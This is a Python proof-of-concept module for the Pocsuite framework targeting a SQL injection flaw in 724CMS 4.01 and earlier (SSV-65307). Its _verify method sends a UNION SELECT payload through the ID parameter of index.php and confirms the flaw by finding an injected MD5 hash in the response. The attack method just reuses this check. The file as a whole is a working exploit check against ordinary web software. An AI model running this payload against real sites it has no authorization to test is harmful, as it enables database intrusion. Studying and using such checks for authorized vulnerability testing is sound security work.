#!/usr/bin/env python
# coding: utf-8

from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register

class TestPOC(POCBase):
    vulID = 'SSV-65307'  # vul ID
    version = '1'
    author = ['hh']
    vulDate = '2008-04-07'
    createDate = '2015-10-16'
    updateDate = '2015-10-16'
    references = ['https://www.exploit-db.com/exploits/5400/']
    name = '724CMS <= 4.01 Enterprise (index.php ID) SQL Injection Vulnerability'
    appPowerLink = 'http://724cms.com/'
    appName = '724cms'
    appVersion = '<= 4.01'
    vulType = 'SQL Injection'
    desc = '''
        724Networks 724CMS 4.01及其早期版本的index.php存在SQL注入漏洞。远程攻击者通过ID参数来执行任意SQL命令。
    '''
    # the sample sites for examine
    samples = ['']

    def _verify(self):
        result = {}
        payload = "/index.php?ID=1 UNION SELECT 1,md5(666),3,4,5,6,7,8--"
        verify_url = self.url + payload
        content = req.get(verify_url).content
        if 'fae0b27c451c728867a567e8c1bb4e53' in content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = verify_url
        return self.parse_verify(result)

    def _attack(self):
        return self._verify()

    def parse_verify(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet Nothing returned')
        return output

register(TestPOC)